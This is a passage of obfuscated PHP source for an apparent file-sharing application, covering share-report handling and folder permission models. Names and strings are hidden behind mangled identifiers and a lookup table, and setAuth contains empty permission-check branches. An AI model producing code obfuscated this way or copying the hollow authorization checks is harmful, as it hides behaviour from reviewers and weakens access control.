$„ïñÂˆ† = $Ÿ·çÖÊ[$œÈÂÙ’™[90]][$œÈÂÙ’™[193]]; if ($Ÿ·çÖÊ[$œÈÂÙ’™[90]][$œÈÂÙ’™[33]] != $œÈÂÙ’™[230]) { $‡Õ¢¶Ã = $this->_folderReport($„ïñÂˆ†); if (!$‡Õ¢¶Ã) { return; } show_json(LNG($œÈÂÙ’™[2133]) . $œÈÂÙ’™[2134] . $‡Õ¢¶Ã, !1); } $³å´‡œÀ = Model($œÈÂÙ’™[899])->fileInfoGet($Ÿ·çÖÊ[$œÈÂÙ’™[90]][$œÈÂÙ’™[193]]); if (!$³å´‡œÀ) { return; } $†¸ŞÜ«‰ = $this->shareFileMeta($³å´‡œÀ[$œÈÂÙ’™[541]]); if (isset($†¸ŞÜ«‰[$œÈÂÙ’™[450]]) && $†¸ŞÜ«‰[$œÈÂÙ’™[450]] == $œÈÂÙ’™[91]) { show_json(LNG($œÈÂÙ’™[2135]), !1); } } private function _folderReport($âû¿°À˜) { $»ºÑ¶Ü =& $_SERVER[ˆ¡¹µ‹Â]; $­‰Ø¶¾° = array($»ºÑ¶Ü[541] => array($»ºÑ¶Ü[1083], 0), $»ºÑ¶Ü[817] => 3); $Àöï©› = Model($»ºÑ¶Ü[2136])->where($­‰Ø¶¾°)->field($»ºÑ¶Ü[541])->select(); if (!$Àöï©›) { return !1; } $Àöï©› = array_to_keyvalue($Àöï©›, $»ºÑ¶Ü[12], $»ºÑ¶Ü[541]); $àÉÅÕüµ = $»ºÑ¶Ü[50] . $âû¿°À˜ . $»ºÑ¶Ü[50]; $­‰Ø¶¾° = array($»ºÑ¶Ü[541] => array($»ºÑ¶Ü[7], $Àöï©›), $»ºÑ¶Ü[584] => array($»ºÑ¶Ü[459], "\x25{$àÉÅÕüµ}\45"), $»ºÑ¶Ü[505] => 0); $¼Â®ú°¢ = Model($»ºÑ¶Ü[899])->where($­‰Ø¶¾°)->field($»ºÑ¶Ü[2137])->find(); if (!$¼Â®ú°¢) { return !1; } $¢›İÂğã = substr($¼Â®ú°¢[$»ºÑ¶Ü[584]], strpos($¼Â®ú°¢[$»ºÑ¶Ü[584]], $àÉÅÕüµ)); $­‰Ø¶¾° = array($»ºÑ¶Ü[193] => array($»ºÑ¶Ü[7], trim($¢›İÂğã, $»ºÑ¶Ü[50]))); $¤¬Ñß»· = Model($»ºÑ¶Ü[899])->where($­‰Ø¶¾°)->field($»ºÑ¶Ü[32])->select(); $Á¸“ÊÌ¼ = array_to_keyvalue($¤¬Ñß»·, $»ºÑ¶Ü[12], $»ºÑ¶Ü[32]); $Á¸“ÊÌ¼[] = $¼Â®ú°¢[$»ºÑ¶Ü[32]]; return implode($»ºÑ¶Ü[8], $Á¸“ÊÌ¼); } protected function remove($è¤–¿œŒ) { $ó‘—Ô¾Ñ =& $_SERVER[ˆ¡¹µ‹Â]; $±—á±Ÿº = is_array($è¤–¿œŒ) ? $è¤–¿œŒ : array($è¤–¿œŒ); for ($ ‘Ÿºé¦ = 0; $ ‘Ÿºé¦ < count($±—á±Ÿº); $ ‘Ÿºé¦++) { $ÜÇíó·à = $this->getInfo($±—á±Ÿº[$ ‘Ÿºé¦]); if ($ÜÇíó·à[$ó‘—Ô¾Ñ[663]] == $ó‘—Ô¾Ñ[91]) { Model($ó‘—Ô¾Ñ[633])->eventShare($ÜÇíó·à[$ó‘—Ô¾Ñ[193]], $ó‘—Ô¾Ñ[2124]); } if ($ÜÇíó·à[$ó‘—Ô¾Ñ[562]] == $ó‘—Ô¾Ñ[91]) { Model($ó‘—Ô¾Ñ[633])->eventShare($ÜÇíó·à[$ó‘—Ô¾Ñ[193]], $ó‘—Ô¾Ñ[2123]); } } if (is_array($è¤–¿œŒ)) { $è¤–¿œŒ = array($ó‘—Ô¾Ñ[7], $è¤–¿œŒ); } $ÛÁ—Øóƒ = array($ó‘—Ô¾Ñ[665] => $è¤–¿œŒ); $ÎØ¯ü ¶ = $this->where($ÛÁ—Øóƒ)->delete(); if ($ÎØ¯ü ¶) { Model($ó‘—Ô¾Ñ[666])->where(array($ó‘—Ô¾Ñ[665] => $è¤–¿œŒ))->delete(); } return $ÎØ¯ü ¶; } protected function removeBySource($ÛË€ñ¬å) { $„ßØ­Åô =& $_SERVER[ˆ¡¹µ‹Â]; $õ™…³Ä– = array($„ßØ­Åô[491] => array($„ßØ­Åô[492], $ÛË€ñ¬å)); $¶Õ²Ò¾ = $this->field($„ßØ­Åô[665])->where($õ™…³Ä–)->select(); $¶Õ²Ò¾ = array_to_keyvalue($¶Õ²Ò¾, $„ßØ­Åô[12], $„ßØ­Åô[665]); if (!$¶Õ²Ò¾) { return; } $õ™…³Ä– = array($„ßØ­Åô[2130] => array($„ßØ­Åô[492], $¶Õ²Ò¾)); $this->where($õ™…³Ä–)->delete(); Model($„ßØ­Åô[666])->where($õ™…³Ä–)->delete(); } public function listAll($„Î¬ëà˜) { $‚ÇÓ’î† =& $_SERVER[ˆ¡¹µ‹Â]; $‚¶ï§ÇÅ = array(); if ($„Î¬ëà˜[$‚ÇÓ’î†[1763]]) { $‚¶ï§ÇÅ[$‚ÇÓ’î†[1763]] = $„Î¬ëà˜[$‚ÇÓ’î†[1763]]; } if ($„Î¬ëà˜[$‚ÇÓ’î†[827]]) { $ÔÊì¤ïÀ = $„Î¬ëà˜[$‚ÇÓ’î†[828]] ? $„Î¬ëà˜[$‚ÇÓ’î†[828]] : strtotime(date($‚ÇÓ’î†[2138])); $‚¶ï§ÇÅ[$‚ÇÓ’î†[231]] = array($‚ÇÓ’î†[409], array($„Î¬ëà˜[$‚ÇÓ’î†[827]], $ÔÊì¤ïÀ)); } if ($„Î¬ëà˜[$‚ÇÓ’î†[33]]) { $‚¶ï§ÇÅ[$„Î¬ëà˜[$‚ÇÓ’î†[33]]] = 1; } else { $‚¶ï§ÇÅ[] = array($‚ÇÓ’î†[562] => array($‚ÇÓ’î†[1083], 0), $‚ÇÓ’î†[663] => array($‚ÇÓ’î†[1083], 0), $‚ÇÓ’î†[2112] => $‚ÇÓ’î†[2064]); } if ($„Î¬ëà˜[$‚ÇÓ’î†[2060]]) { $‚¶ï§ÇÅ[] = array($‚ÇÓ’î†[2109] => $„Î¬ëà˜[$‚ÇÓ’î†[2060]], $‚ÇÓ’î†[1652] => array($‚ÇÓ’î†[459], "\x25{$„Î¬ëà˜[$‚ÇÓ’î†[2060]]}\x25"), $‚ÇÓ’î†[2112] => $‚ÇÓ’î†[2064]); } $Óúû ô“ = $this->_makeOrder()->where($‚¶ï§ÇÅ)->selectPage(20); if (empty($Óúû ô“[$‚ÇÓ’î†[445]])) { return array(); } $this->_listDataApply($Óúû ô“[$‚ÇÓ’î†[445]]); return $Óúû ô“; } public function listDataApply($‘İ±ÖÆË) { $this->_listDataApply($‘İ±ÖÆË); return $‘İ±ÖÆË; } private function _listDataApply(&$ß•¨ö¹è) { $¸ô²ËŞÚ =& $_SERVER[ˆ¡¹µ‹Â]; $ŸÜã° = array_to_keyvalue($ß•¨ö¹è, $¸ô²ËŞÚ[12], $¸ô²ËŞÚ[1763]); $”òÍ›šÇ = Model($¸ô²ËŞÚ[598])->userListInfo(array_unique($ŸÜã°)); $ÃØÆàà = array_to_keyvalue($ß•¨ö¹è, $¸ô²ËŞÚ[12], $¸ô²ËŞÚ[193]); $áÖ«¤¦é = Model($¸ô²ËŞÚ[899])->sourceListInfo($ÃØÆàà, !0); foreach ($ß•¨ö¹è as $æãŒè³ı => &$ş®æĞ¾) { $§ıƒï¢Ü = $ş®æĞ¾[$¸ô²ËŞÚ[1763]]; $ş®æĞ¾[$¸ô²ËŞÚ[2139]] = $”òÍ›šÇ[$§ıƒï¢Ü] ? $”òÍ›šÇ[$§ıƒï¢Ü] : !1; $¿Ô´š¹’ = $ş®æĞ¾[$¸ô²ËŞÚ[193]]; $ş®æĞ¾[$¸ô²ËŞÚ[90]] = $áÖ«¤¦é[$¿Ô´š¹’] ? $áÖ«¤¦é[$¿Ô´š¹’] : !1; if ($ş®æĞ¾[$¸ô²ËŞÚ[90]][$¸ô²ËŞÚ[505]] == $¸ô²ËŞÚ[91]) { unset($ß•¨ö¹è[$æãŒè³ı]); } if ($ş®æĞ¾[$¸ô²ËŞÚ[90]] != $¸ô²ËŞÚ[228] && !$ş®æĞ¾[$¸ô²ËŞÚ[90]]) { unset($ß•¨ö¹è[$æãŒè³ı]); } } unset($ş®æĞ¾); $ß•¨ö¹è = array_values($ß•¨ö¹è); } private function _makeOrder($Ï¨›· = '') { $°›Î¸ßÀ =& $_SERVER[ˆ¡¹µ‹Â]; $¸Ì‹È’í = array($°›Î¸ßÀ[231], $°›Î¸ßÀ[828], $°›Î¸ßÀ[2126], $°›Î¸ßÀ[2127]); $’æ¾‘úœ = array($°›Î¸ßÀ[523] => $°›Î¸ßÀ[524], $°›Î¸ßÀ[525] => $°›Î¸ßÀ[526]); $‚Ñé¨Îø = Input::get($°›Î¸ßÀ[530], $°›Î¸ßÀ[7], $°›Î¸ßÀ[497], $¸Ì‹È’í); $Ÿè‰¸õ = Input::get($°›Î¸ßÀ[531], $°›Î¸ßÀ[7], $°›Î¸ßÀ[2140], array($°›Î¸ßÀ[2057], $°›Î¸ßÀ[525])); $Ÿè‰¸õ = $’æ¾‘úœ[$Ÿè‰¸õ]; $Ï¨›· = $Ï¨›· . "{$‚Ñé¨Îø}\40{$Ÿè‰¸õ}"; return $this->order($Ï¨›·); } public function reportAdd($ßÑöÄòë) { $„‚ŒªƒŸ =& $_SERVER[ˆ¡¹µ‹Â]; $³ııë„ = array($„‚ŒªƒŸ[665] => $ßÑöÄòë[$„‚ŒªƒŸ[665]], $„‚ŒªƒŸ[1763] => USER_ID); if (Model($„‚ŒªƒŸ[2136])->where($³ııë„)->find()) { return !1; } $Œê›è…õ = array($„‚ŒªƒŸ[665] => $ßÑöÄòë[$„‚ŒªƒŸ[665]], $„‚ŒªƒŸ[1652] => $ßÑöÄòë[$„‚ŒªƒŸ[1652]], $„‚ŒªƒŸ[193] => $ßÑöÄòë[$„‚ŒªƒŸ[193]], $„‚ŒªƒŸ[541] => $ßÑöÄòë[$„‚ŒªƒŸ[541]], $„‚ŒªƒŸ[1763] => USER_ID, $„‚ŒªƒŸ[33] => $ßÑöÄòë[$„‚ŒªƒŸ[33]], $„‚ŒªƒŸ[526] => $ßÑöÄòë[$„‚ŒªƒŸ[526]]); return Model($„‚ŒªƒŸ[2136])->add($Œê›è…õ); } public function reportList($ìÂ¶Ú¡ê) { $€¾ÍÔöÑ =& $_SERVER[ˆ¡¹µ‹Â]; $°ğ“ä = array(); if ($ìÂ¶Ú¡ê[$€¾ÍÔöÑ[827]]) { $ñ¼ëÊî = $ìÂ¶Ú¡ê[$€¾ÍÔöÑ[828]] ? $ìÂ¶Ú¡ê[$€¾ÍÔöÑ[828]] : strtotime(date($€¾ÍÔöÑ[2138])); $°ğ“ä[$€¾ÍÔöÑ[231]] = array($€¾ÍÔöÑ[409], array($ìÂ¶Ú¡ê[$€¾ÍÔöÑ[827]], $ñ¼ëÊî)); } if (isset($ìÂ¶Ú¡ê[$€¾ÍÔöÑ[33]]) && in_array($ìÂ¶Ú¡ê[$€¾ÍÔöÑ[33]], array($€¾ÍÔöÑ[91], $€¾ÍÔöÑ[510], $€¾ÍÔöÑ[2141], $€¾ÍÔöÑ[2142], $€¾ÍÔöÑ[2143]))) { $°ğ“ä[$€¾ÍÔöÑ[33]] = $ìÂ¶Ú¡ê[$€¾ÍÔöÑ[33]]; } if (isset($ìÂ¶Ú¡ê[$€¾ÍÔöÑ[817]]) && in_array($ìÂ¶Ú¡ê[$€¾ÍÔöÑ[817]], array($€¾ÍÔöÑ[228], $€¾ÍÔöÑ[91], $€¾ÍÔöÑ[510], $€¾ÍÔöÑ[2141]))) { $°ğ“ä[$€¾ÍÔöÑ[817]] = $ìÂ¶Ú¡ê[$€¾ÍÔöÑ[817]]; } $éšÈ»Œ¡ = Input::get($€¾ÍÔöÑ[531], $€¾ÍÔöÑ[7], $€¾ÍÔöÑ[2140], array($€¾ÍÔöÑ[2057], $€¾ÍÔöÑ[525])); $–ÔõÚ½ = array($€¾ÍÔöÑ[523] => $€¾ÍÔöÑ[524], $€¾ÍÔöÑ[525] => $€¾ÍÔöÑ[526]); $Šİƒ¨ò = $€¾ÍÔöÑ[2144] . $–ÔõÚ½[$éšÈ»Œ¡]; $øĞˆíõˆ = Model($€¾ÍÔöÑ[2136])->where($°ğ“ä)->order($Šİƒ¨ò)->selectPage(20); if (empty($øĞˆíõˆ[$€¾ÍÔöÑ[445]])) { return array(); } $İËºòëª = array_to_keyvalue_group($øĞˆíõˆ[$€¾ÍÔöÑ[445]], $€¾ÍÔöÑ[817], $€¾ÍÔöÑ[665]); if (!empty($İËºòëª[0])) { $ìÂ¶Ú¡ê = $İËºòëª[0]; $°ğ“ä = array($€¾ÍÔöÑ[665] => array($€¾ÍÔöÑ[7], $ìÂ¶Ú¡ê)); $û¡•¿¾Ï = $this->where($°ğ“ä)->field($€¾ÍÔöÑ[665])->select(); $û¡•¿¾Ï = array_to_keyvalue($û¡•¿¾Ï, $€¾ÍÔöÑ[12], $€¾ÍÔöÑ[665]); $‡àÃüîœ = array_diff($ìÂ¶Ú¡ê, $û¡•¿¾Ï); if (!empty($‡àÃüîœ)) { foreach ($øĞˆíõˆ[$€¾ÍÔöÑ[445]] as $›¹òÊõŸ => $·Ù“óè¶) { if (in_array($·Ù“óè¶[$€¾ÍÔöÑ[665]], $‡àÃüîœ)) { unset($øĞˆíõˆ[$€¾ÍÔöÑ[445]][$›¹òÊõŸ]); } } } } $this->_listDataApply($øĞˆíõˆ[$€¾ÍÔöÑ[445]]); return $øĞˆíõˆ; } public function reportStatus($–ÈÕ£¿) { $¿°ÂÚ¨ç =& $_SERVER[ˆ¡¹µ‹Â]; $Ó§¨¤åÉ = array($¿°ÂÚ¨ç[475] => $–ÈÕ£¿[$¿°ÂÚ¨ç[475]]); $®òåºÉ = Model($¿°ÂÚ¨ç[2136])->where($Ó§¨¤åÉ)->field($¿°ÂÚ¨ç[2145])->find(); if (!$®òåºÉ) { return !1; } $ï×Ğ¼—ä = array($¿°ÂÚ¨ç[817] => $–ÈÕ£¿[$¿°ÂÚ¨ç[817]]); if ($–ÈÕ£¿[$¿°ÂÚ¨ç[817]] == $¿°ÂÚ¨ç[2141] && $®òåºÉ[$¿°ÂÚ¨ç[817]] == $¿°ÂÚ¨ç[2141]) { $ï×Ğ¼—ä[$¿°ÂÚ¨ç[817]] = 0; } $×áÙşÑ = Model($¿°ÂÚ¨ç[2136])->where($Ó§¨¤åÉ)->save($ï×Ğ¼—ä); if ($–ÈÕ£¿[$¿°ÂÚ¨ç[817]] == $¿°ÂÚ¨ç[510]) { if ($®òåºÉ[$¿°ÂÚ¨ç[541]] != $¿°ÂÚ¨ç[228] && $this->shareFileMeta($®òåºÉ[$¿°ÂÚ¨ç[541]])) { $this->shareFileMeta($®òåºÉ[$¿°ÂÚ¨ç[541]], 0); } $this->remove($®òåºÉ[$¿°ÂÚ¨ç[665]]); return !0; } if ($×áÙşÑ && $–ÈÕ£¿[$¿°ÂÚ¨ç[817]] == $¿°ÂÚ¨ç[2141]) { $¦¥ü›ú = $ï×Ğ¼—ä[$¿°ÂÚ¨ç[817]] == $¿°ÂÚ¨ç[2141] ? 1 : 0; $this->shareFileMeta($®òåºÉ[$¿°ÂÚ¨ç[541]], $¦¥ü›ú); $this->removeByFile($®òåºÉ[$¿°ÂÚ¨ç[541]]); } return $×áÙşÑ; } private function removeByFile($… ¡×ÕÂ) { $ÚÆÎü¹¢ =& $_SERVER[ˆ¡¹µ‹Â]; $ñÇ”‰ë = Model($ÚÆÎü¹¢[899])->where(array($ÚÆÎü¹¢[541] => $… ¡×ÕÂ))->field($ÚÆÎü¹¢[193])->select(); $ª‚²…øß = array_to_keyvalue($ñÇ”‰ë, $ÚÆÎü¹¢[12], $ÚÆÎü¹¢[193]); $ÃÛèİ†ˆ = array($ÚÆÎü¹¢[193] => array($ÚÆÎü¹¢[7], $ª‚²…øß), $ÚÆÎü¹¢[562] => 1); $ñÇ”‰ë = $this->where($ÃÛèİ†ˆ)->field($ÚÆÎü¹¢[665])->select(); if (empty($ñÇ”‰ë)) { return; } $±óØ«Ë = array_to_keyvalue($ñÇ”‰ë, $ÚÆÎü¹¢[12], $ÚÆÎü¹¢[665]); $this->remove($±óØ«Ë); } private function shareFileMeta($ø÷şØ¼Ø, $äÇ–ŠÇ = null) { $Æåû‘Í… =& $_SERVER[ˆ¡¹µ‹Â]; $¦Â«ø©õ = array($Æåû‘Í…[541] => $ø÷şØ¼Ø, $Æåû‘Í…[97] => $Æåû‘Í…[2146]); if (is_null($äÇ–ŠÇ)) { return Model($Æåû‘Í…[2147])->where($¦Â«ø©õ)->find(); } $¦Â«ø©õ[$Æåû‘Í…[450]] = $äÇ–ŠÇ; Model($Æåû‘Í…[2147])->add($¦Â«ø©õ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\x72\143\x65\137\x61\165\x74\x68"; public function getAuth($ÕÃ¯ÇÜâ) { $ØÚş‘ˆ =& $_SERVER[ˆ¡¹µ‹Â]; $®„§œšÃ = $this->sourceAuthSelect($ÕÃ¯ÇÜâ); $Ÿ”¹¼”Ş = array(); $èŒ»Œïç = array(); $±ö€¯üÓ = 2 << 25; foreach ($®„§œšÃ as $ôœ¤®Ì•) { $¨–ææûğ = Model($ØÚş‘ˆ[571])->listData($ôœ¤®Ì•[$ØÚş‘ˆ[2070]]); if (!$¨–ææûğ) { continue; } $Ÿ”¹¼”Ş[] = $ôœ¤®Ì•; $‰©ÎÉ‹¿ = 0; if ($ôœ¤®Ì•[$ØÚş‘ˆ[190]] == SourceModel::TYPE_GROUP) { $‰©ÎÉ‹¿ = $±ö€¯üÓ * 2; } if ($ôœ¤®Ì•[$ØÚş‘ˆ[190]] == SourceModel::TYPE_USER) { $‰©ÎÉ‹¿ = $±ö€¯üÓ; } if ($ôœ¤®Ì•[$ØÚş‘ˆ[190]] == SourceModel::TYPE_USER && $ôœ¤®Ì•[$ØÚş‘ˆ[569]] == $ØÚş‘ˆ[228]) { $‰©ÎÉ‹¿ = 0; } $èŒ»Œïç[] = $¨–ææûğ[$ØÚş‘ˆ[487]] + $‰©ÎÉ‹¿; } array_multisort($èŒ»Œïç, SORT_DESC, $Ÿ”¹¼”Ş); return $Ÿ”¹¼”Ş; } public function sourceAuthSelect($Ø’ö­–è) { $Å·­Úü™ =& $_SERVER[ˆ¡¹µ‹Â]; static $°º—ÎÔ = array(); $ŒÂ½ã×° = is_array($Ø’ö­–è) ? !1 : !0; if ($ŒÂ½ã×°) { $Ø’ö­–è = array($Ø’ö­–è); } $ëû½Ïù˜ = array(); foreach ($Ø’ö­–è as $£¶Å›‡É) { if (isset($°º—ÎÔ[$£¶Å›‡É])) { $ëû½Ïù˜[$£¶Å›‡É] = $°º—ÎÔ[$£¶Å›‡É]; } } if (count($ëû½Ïù˜) == count($Ø’ö­–è)) { return $ŒÂ½ã×° ? $ëû½Ïù˜[$Ø’ö­–è[0]] : $ëû½Ïù˜; } $ìšÙ÷ = $Å·­Úü™[2148]; $Èì½Œ• = array($Å·­Úü™[193] => array($Å·­Úü™[7], $Ø’ö­–è)); $Šş°õêÓ = $this->field($ìšÙ÷)->order($Å·­Úü™[475])->where($Èì½Œ•)->select(); $ı­¶í´œ = array_to_keyvalue_group($Šş°õêÓ, $Å·­Úü™[193]); foreach ($Ø’ö­–è as $£¶Å›‡É) { $°º—ÎÔ[$£¶Å›‡É] = $ı­¶í´œ[$£¶Å›‡É] ? $ı­¶í´œ[$£¶Å›‡É] : array(); } if ($ŒÂ½ã×°) { return $Šş°õêÓ; } return $ı­¶í´œ; } public function setAuth($‡¿Ñâ–Û, $¡Ã¥¯«İ) { $®•÷è“ =& $_SERVER[ˆ¡¹µ‹Â]; $æìà˜Ö· = Model($®•÷è“[1411])->sourceInfo($‡¿Ñâ–Û); if (!$æìà˜Ö·) { return !1; } if ($æìà˜Ö·[$®•÷è“[190]] != SourceModel::TYPE_GROUP) { return !1; } $¸Ş«—–¾ = 1; $¡ç°¢ö« = $æìà˜Ö·[$®•÷è“[569]]; if ($¡ç°¢ö« != $¸Ş«—–¾) { $œÑ¶±® = array($®•÷è“[1962] => $¡ç°¢ö«); $öƒÎĞÂø = Model($®•÷è“[2056])->field($®•÷è“[1763])->where($œÑ¶±®)->select(); $öƒÎĞÂø = array_to_keyvalue($öƒÎĞÂø, $®•÷è“[12], $®•÷è“[1763]); } $¼Ò—€Ğã = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ÚÓêê— = array(); foreach ($¡Ã¥¯«İ as $î§ã¿æ) { if (!in_array($î§ã¿æ[$®•÷è“[190]], $¼Ò—€Ğã)) { show_json(LNG($®•÷è“[2149]), !1); } if ($¡ç°¢ö« != $¸Ş«—–¾) { if ($î§ã¿æ[$®•÷è“[190]] == SourceModel::TYPE_GROUP) { } if ($î§ã¿æ[$®•÷è“[569]] != 0 && !in_array($î§ã¿æ[$®•÷è“[569]], $öƒÎĞÂø)) { } } if ($î§ã¿æ[$®•÷è“[569]] == 0) { $î§ã¿æ[$®•÷è“[190]] = SourceModel::TYPE_USER; } $ÚÓêê—[] = array($®•÷è“[193] => $‡¿Ñâ–Û, $®•÷è“[190] => intval($î§ã¿æ[$®•÷è“[190]]), $®•÷è“[569] => intval($î§ã¿æ[$®•÷è“[569]]), $®•÷è“[2070] => intval($î§ã¿æ[$®•÷è“[2070]]) ? intval($î§ã¿æ[$®•÷è“[2070]]) : 0, $®•÷è“[2131] => intval($î§ã¿æ[$®•÷è“[2131]]) ? intval($î§ã¿æ[$®•÷è“[2131]]) : -1); } $this->where(array($®•÷è“[491] => $‡¿Ñâ–Û))->delete(); $this->addAll($ÚÓêê—); return !0; } public function authClear($üÍäãÍŸ) { $ªáÆÆä =& $_SERVER[ˆ¡¹µ‹Â]; $‘Î»°ûÀ = Model($ªáÆÆä[1411])->sourceInfo($üÍäãÍŸ); $ÕÔ…¡ = array($üÍäãÍŸ); if ($‘Î»°ûÀ[$ªáÆÆä[485]] == $ªáÆÆä[91]) { $½¡×öèä = array($ªáÆÆä[652] => array($ªáÆÆä[612], $‘Î»°ûÀ[$ªáÆÆä[584]] . $üÍäãÍŸ . $ªáÆÆä[613])); $ÕÔ…¡ = Model($ªáÆÆä[1411])->field($ªáÆÆä[491])->where($½¡×öèä)->getField($ªáÆÆä[193], !0); $ÕÔ…¡[] = $üÍäãÍŸ; } $this->where(array($ªáÆÆä[491] => array($ªáÆÆä[492], $ÕÔ…¡)))->delete(); return !0; } public function getAllChildren($ÆåášÙÉ) { $ ÔŸ¾Ä =& $_SERVER[ˆ¡¹µ‹Â]; $É¤·åã = Model($ ÔŸ¾Ä[1411])->sourceInfo($ÆåášÙÉ); if ($É¤·åã[$ ÔŸ¾Ä[485]] != $ ÔŸ¾Ä[91]) { return $this->sourceListAuth(array($ÆåášÙÉ)); } if ($É¤·åã[$ ÔŸ¾Ä[190]] != SourceModel::TYPE_GROUP) { return array(); } $õš‹™ = 1; $âı³£Á´ = array($ÆåášÙÉ); if ($É¤·åã[$ ÔŸ¾Ä[192]] == $ ÔŸ¾Ä[228] && $É¤·åã[$ ÔŸ¾Ä[569]] != $õš‹™) { $âı³£Á´ = $this->groupChidldAllRootSource($É¤·åã[$ ÔŸ¾Ä[569]]); } $ãØÂ×º = $this->field($ ÔŸ¾Ä[193])->group($ ÔŸ¾Ä[193])->select(); $ãØÂ×º = array_to_keyvalue($ãØÂ×º, $ ÔŸ¾Ä[12], $ ÔŸ¾Ä[193]); if (!$ãØÂ×º) { return array(); } $‚ùèâ¥‡ = $ ÔŸ¾Ä[2150]; $Šº—ÂÛ = array($ ÔŸ¾Ä[193] => array($ ÔŸ¾Ä[7], $ãØÂ×º), $ ÔŸ¾Ä[505] => $ ÔŸ¾Ä[228]); $ÂëÍ•¨à = Model($ ÔŸ¾Ä[899])->field($‚ùèâ¥‡)->where($Šº—ÂÛ)->select(); $¡îÔ„Õê = array($ÆåášÙÉ); foreach ($ÂëÍ•¨à as $Ÿ¶úú¸) { foreach ($âı³£Á´ as $ò¥Š…ü¨) { $¦¾§òÏñ = $ ÔŸ¾Ä[50] . $ò¥Š…ü¨ . $ ÔŸ¾Ä[50]; $åï°¼Ş = $Ÿ¶úú¸[$ ÔŸ¾Ä[584]] . $Ÿ¶úú¸[$ ÔŸ¾Ä[193]] . $ ÔŸ¾Ä[50]; if (strstr($åï°¼Ş, $¦¾§òÏñ)) { $¡îÔ„Õê[] = $Ÿ¶úú¸[$ ÔŸ¾Ä[193]]; break; } } } return $this->sourceListAuth($¡îÔ„Õê); } private function sourceListAuth($Ã˜ÛÔ‚œ) { $Â§…­íÎ =& $_SERVER[ˆ¡¹µ‹Â]; $êµ±Ìò = Model($Â§…­íÎ[1411])->sourceListInfo($Ã˜ÛÔ‚œ, !0); $êéÙİğû = $this->sourceAuthSelect($Ã˜ÛÔ‚œ); $›áÜ¾Ãî = array(); $ãÆ¿Êª = array(); foreach ($êµ±Ìò as $¯ºúŠï) { unset($¯ºúŠï[$Â§…­íÎ[529]]); unset($¯ºúŠï[$Â§…­íÎ[527]]); unset($¯ºúŠï[$Â§…­íÎ[487]]); unset($¯ºúŠï[$Â§…­íÎ[90]]); $šÊåÒá = $êéÙİğû[$¯ºúŠï[$Â§…­íÎ[193]]]; if (!$šÊåÒá) { continue; } $¯ºúŠï[$Â§…­íÎ[2151]] = $this->authTargetInfo($šÊåÒá); $¯ºúŠï[$Â§…­íÎ[582]] = rtrim($¯ºúŠï[$Â§…­íÎ[588]], $Â§…­íÎ[8]) . $Â§…­íÎ[8] . ltrim($¯ºúŠï[$Â§…­íÎ[582]], $Â§…­íÎ[8]); $›áÜ¾Ãî[] = $¯ºúŠï; $è“ƒÓÚ = count(explode($Â§…­íÎ[8], trim($¯ºúŠï[$Â§…­íÎ[582]], $Â§…­íÎ[8]))); $ãÆ¿Êª[] = $è“ƒÓÚ + ($¯ºúŠï[$Â§…­íÎ[33]] == $Â§…­íÎ[78] ? 0 : 1000); } array_multisort($ãÆ¿Êª, SORT_ASC, $›áÜ¾Ãî); return $›áÜ¾Ãî; } private function groupChidldAllRootSource($È¼“‚ÍÅ) { $•ªú« =& $_SERVER[ˆ¡¹µ‹Â]; $íó¿ßØŞ = Model($•ªú«[2152])->groupChildrenAll($È¼“‚ÍÅ); $ÂÆ»ÖÆ = array($•ªú«[192] => 0, $•ªú«[569] => array($•ªú«[7], $íó¿ßØŞ), $•ªú«[190] => SourceModel::TYPE_GROUP); $±ù†å = Model($•ªú«[899])->field($•ªú«[193])->where($ÂÆ»ÖÆ)->select(); $±ù†å = array_to_keyvalue($±ù†å, $•ªú«[12], $•ªú«[193]); return $±ù†å; } private function authTargetInfo($¬ô£Õï‡) { $Æ´°§à‡ =& $_SERVER[ˆ¡¹µ‹Â]; $ıÕ¥ÚË™ = array(); $Õì»Ø¶ = array(); $Ÿî“ö‹ = 2 << 25; foreach ($¬ô£Õï‡ as $ÆËø°¾Ş) { $¾—Ä™÷¤ = Model($Æ´°§à‡[571])->listData($ÆËø°¾Ş[$Æ´°§à‡[2070]]); if (!$¾—Ä™÷¤) { continue; } if ($ÆËø°¾Ş[$Æ´°§à‡[190]] == SourceModel::TYPE_USER) { $Ø˜ƒÒÅ½ = Model($Æ´°§à‡[577])->getInfoSimpleOuter($ÆËø°¾Ş[$Æ´°§à‡[569]]); if ($Ø˜ƒÒÅ½[$Æ´°§à‡[1763]] == $Æ´°§à‡[1266]) { continue; } if ($Ø˜ƒÒÅ½[$Æ´°§à‡[1763]] == $Æ´°§à‡[228]) { $Ø˜ƒÒÅ½[$Æ´°§à‡[32]] = LNG($Æ´°§à‡[2153]); } } else { $Ø˜ƒÒÅ½ = Model($Æ´°§à‡[585])->getInfoSimple($ÆËø°¾Ş[$Æ´°§à‡[569]]); } if (!$Ø˜ƒÒÅ½) { continue; } $Ø˜ƒÒÅ½[$Æ´°§à‡[540]] = $¾—Ä™÷¤; $ıÕ¥ÚË™[] = $Ø˜ƒÒÅ½; $êëçæÛ‚ = 0; if ($ÆËø°¾Ş[$Æ´°§à‡[190]] == SourceModel::TYPE_GROUP) { $êëçæÛ‚ = $Ÿî“ö‹ * 2; } if ($ÆËø°¾Ş[$Æ´°§à‡[190]] == SourceModel::TYPE_USER) { $êëçæÛ‚ = $Ÿî“ö‹; } if ($ÆËø°¾Ş[$Æ´°§à‡[190]] == SourceModel::TYPE_USER && $ÆËø°¾Ş[$Æ´°§à‡[569]] == $Æ´°§à‡[228]) { $êëçæÛ‚ = 0; } $Õì»Ø¶[] = $¾—Ä™÷¤[$Æ´°§à‡[487]] + $êëçæÛ‚; } array_multisort($Õì»Ø¶, SORT_DESC, $ıÕ¥ÚË™); return $ıÕ¥ÚË™; } public function getAllChildrenByUser($ŞñğíÅÍ, $£¥úÃºğ) { $èÜ²®ºû =& $_SERVER[ˆ¡¹µ‹Â]; $”¯ÆµÑ÷ = Model($èÜ²®ºû[598])->getInfo($£¥úÃºğ); if (!$£¥úÃºğ || !$ŞñğíÅÍ || !$”¯ÆµÑ÷) { return array(); } $ö‘êæÖï = Model($èÜ²®ºû[1411])->sourceInfo($ŞñğíÅÍ); $¬ÉÊæ½ú = array(); $æ†ÁÆ¬’ = 1; if ($ö‘êæÖï[$èÜ²®ºû[192]] == $èÜ²®ºû[228] && $ö‘êæÖï[$èÜ²®ºû[569]] != $æ†ÁÆ¬’ && $this->groupContainUser($ö‘êæÖï[$èÜ²®ºû[569]], $£¥úÃºğ)) { foreach 